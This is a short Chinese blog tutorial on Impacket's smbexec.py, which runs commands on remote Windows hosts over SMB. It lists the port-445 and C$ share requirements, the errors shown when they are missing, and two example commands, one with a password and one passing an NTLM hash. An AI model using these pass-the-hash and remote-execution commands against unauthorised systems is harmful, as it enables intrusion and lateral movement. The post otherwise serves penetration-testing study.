**目录**

[Impacket中的smbexec.py](#t0 "Impacket中的smbexec.py")

* * *

smbexec可以通过文件共享在运程系统中执行命令。对方主机需要开启 **c$** 共享，依赖于**445**端口。

如果对方没开启445端口，则报如下错：

```
[-] [Errno Connection error (xx.xx.xx.xx:445)] [WinError 10060] 由于连接方在一段时间后没有正确答复或连接的主机没有反应，连接尝 试失败。
```


![](https://img-blog.csdnimg.cn/20201020233315572.png)

如果对方开启了445端口，但是没有开启C$共享，则报如下错：

```
[-] SMB SessionError: STATUS_BAD_NETWORK_NAME({Network Name Not Found} The specified share name cannot be found on the remote server.)
```


![](https://img-blog.csdnimg.cn/20201020233248759.png)

Impacket中的smbexec.py
--------------------

命令如下

```
./smbexec.py xie/hack:x123456./@192.168.10.130      
./smbexec.py xie/hack@192.168.10.130 -hashes aada8eda23213c027743e6c498d751aa:b98e75b5ff7a3d3ff05e07f211ebe7a8
```


![](https://img-blog.csdnimg.cn/20200327153400454.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)